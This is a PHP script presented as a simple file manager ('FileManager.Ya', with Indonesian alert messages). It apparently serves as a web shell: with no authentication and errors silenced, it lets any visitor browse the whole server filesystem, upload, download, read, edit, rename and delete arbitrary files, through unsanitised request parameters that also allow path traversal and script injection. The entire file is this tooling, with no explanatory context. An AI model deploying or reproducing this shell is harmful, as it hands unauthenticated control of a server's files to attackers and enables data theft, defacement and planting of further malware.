<?php
error_reporting(0);
set_time_limit(0);
date_default_timezone_set("Asia/Jakarta");

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);
chdir($path);

function perms($file){
    $perms = fileperms($file);
    $info = '';
    $info .= ($perms & 0x1000) ? 'p' : (($perms & 0x2000) ? 'c' : (($perms & 0x4000) ? 'd' : '-'));
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? 'x' : '-';
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? 'x' : '-';
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? 'x' : '-';
    return $info;
}

echo "<!DOCTYPE html><html><head><title>FileManager.Ya</title><style>
body{background:#111;color:#eee;font-family:monospace}
a{color:#0ff;text-decoration:none}
input,textarea,select,button{background:#222;color:#0f0;border:1px solid #444;padding:5px}
table{width:100%;border-collapse:collapse}
td,th{padding:5px;border:1px solid #444}
</style></head><body>";

echo "<h2>📁 Path: $path</h2>";

echo "<form enctype='multipart/form-data' method='POST'>
<input type='file' name='upload'>
<button type='submit'>Upload</button></form>";

if ($_FILES) {
    $target = $path.'/'.$_FILES['upload']['name'];
    $tmp = $_FILES['upload']['tmp_name'];
    if (move_uploaded_file($tmp, $target)) {
        echo "<script>alert('Uploaded 100% BERHASIL!');location.href='?path=".urlencode($path)."'</script>";
    } else {
        echo "<script>alert('Upload GAGAL!');location.href='?path=".urlencode($path)."'</script>";
    }
}

if (isset($_GET['download'])) {
    $f = $_GET['download'];
    header("Content-Type: application/octet-stream");
    header("Content-Disposition: attachment; filename=\"".basename($f)."\"");
    readfile($f);
    exit;
}

if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_dir($target)) rmdir($target); else unlink($target);
    header("Location: ?path=".urlencode($path));
    exit;
}

if (isset($_POST['newfile'])) {
    file_put_contents($_POST['newfile'], '');
}

if (isset($_POST['newfolder'])) {
    mkdir($_POST['newfolder']);
}

if (isset($_GET['edit'])) {
    $f = $_GET['edit'];
    echo "<h3>Edit: $f</h3>
    <form method='POST'>
    <textarea name='content' rows='20' cols='100'>".htmlspecialchars(file_get_contents($f))."</textarea><br>
    <input type='hidden' name='f' value='$f'>
    <button type='submit' name='save'>Save</button></form>";
    exit;
}

if (isset($_POST['save'])) {
    file_put_contents($_POST['f'], $_POST['content']);
    echo "<script>alert('Saved!');location.href='?path=".urlencode($path)."'</script>";
}

if (isset($_GET['rename'])) {
    $old = $_GET['rename'];
    echo "<h3>Rename: $old</h3>
    <form method='POST'>
    <input type='hidden' name='old' value='$old'>
    <input name='new' value='$old'>
    <button type='submit' name='renamego'>Rename</button></form>";
    exit;
}

if (isset($_POST['renamego'])) {
    rename($_POST['old'], $_POST['new']);
    echo "<script>alert('Renamed!');location.href='?path=".urlencode($path)."'</script>";
}

echo "<form method='POST'>
<input name='newfile' placeholder='New File Name'>
<button type='submit'>Create File</button></form>";

echo "<form method='POST'>
<input name='newfolder' placeholder='New Folder'>
<button type='submit'>Create Folder</button></form>";

echo "<table><tr><th>Name</th><th>Size</th><th>Permission</th><th>Action</th></tr>";

if ($path !== '/') {
    echo "<tr><td colspan=4><a href='?path=".urlencode(dirname($path))."'>⬅️ Back</a></td></tr>";
}

foreach (scandir($path) as $file) {
    if ($file == '.' || $file == '..') continue;
    $full = $path.'/'.$file;
    $size = is_dir($full) ? '[DIR]' : filesize($full);
    $perm = perms($full);
    echo "<tr><td><a href='?path=".urlencode($full)."'>$file</a></td>
    <td>$size</td><td>$perm</td><td>";
    echo "<a href='?edit=".urlencode($full)."'>Edit</a> | ";
    echo "<a href='?rename=".urlencode($full)."'>Rename</a> | ";
    echo "<a href='?delete=".urlencode($full)."' onclick='return confirm(\"Delete?\")'>Delete</a> | ";
    if (!is_dir($full)) echo "<a href='?download=".urlencode($full)."'>Download</a>";
    echo "</td></tr>";
}

echo "</table></body></html>";
?>